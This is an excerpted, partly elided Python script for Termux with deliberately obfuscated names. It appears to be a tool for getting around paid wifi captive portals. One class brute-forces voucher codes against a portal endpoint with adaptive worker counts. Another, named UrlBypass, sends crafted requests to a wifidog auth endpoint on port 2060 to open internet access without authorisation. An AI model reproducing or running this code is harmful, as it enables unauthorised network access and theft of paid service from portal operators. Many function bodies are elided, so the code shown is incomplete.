...
async def _g_s_i(session, s_u, p_s_i):
    ...
    try:
        async with session.get(s_u_s, headers=h, timeout=10) as req:
            res = str(req.url)
...
async def _l_v(session, session_id, voucher, tracker=None, is_recheck=False):
    ...
    try:
        async with session.post(post_url, headers=headers, json=data, timeout=10) as req:
...
class _V_C_:
    ...
    async def execute(self):
        ...
        checked_codes = set()
        # Limit file size to avoid memory crash: only load first 50000 lines
        try:
            ...
            print(f"{_y_}[!] Memory low, using only small cache{_w_}")
            time.sleep(1)
        ...
        # Reduce concurrency for Termux stability
        connector = aiohttp.TCPConnector(limit=8)  # was 100
        tracker = {'attempts': 0, 'workers': 3, 'stop': False}  # start with 3 workers
        ...
        async def worker(session):
            ...
            while not tracker['stop']:
                if loop % 30 == 0:  # refresh session less often
                ...
                delay = t2 - t1
                # Adjust workers slowly, keep within 1..6 for Termux
                if status == _d([69, 82, 82, 79, 82]) or delay > 3.0:
                    tracker['workers'] = max(1, tracker['workers'] - 1)
                    await asyncio.sleep(1.0)
                elif delay < 1.0 and tracker['workers'] < 6:
                    tracker['workers'] = min(6, tracker['workers'] + 1)
        ...
        async def worker_manager(session):
            ...
            while not tracker['stop']:
                ...
                target_workers = tracker['workers']
                if len(active_tasks) < target_workers:
                    for _ in range(min(target_workers - len(active_tasks), 2)):  # add slowly
                        active_tasks.add(asyncio.create_task(worker(session)))
                
                await asyncio.sleep(1)  # longer interval
...
class UrlBypass:
    ...
    async def get_session_id(self, session, previous_session_id):
        ...
        try:
            async with session.get(self.portal_url, headers=headers, timeout=10) as req:
    ...
    async def is_internet_access(self, session):
        try:
            async with session.get("https://httpbin.org/", timeout=5) as req:
    ...
    async def send_request(self, session, session_id, log=True):
        ...
        try:
            async with session.post(f'http://{self.ip}:2060/wifidog/auth?', params=params, headers=headers, timeout=8) as response:
                if log:
                    ...
                    print(f"{_w_}time: {now}, status: {status_code}, ping: {ping_str}, internet-open: {is_open}")
        except:
            return
...
def run_async(coro):
    """Helper to run async functions safely in Termux"""
    try:
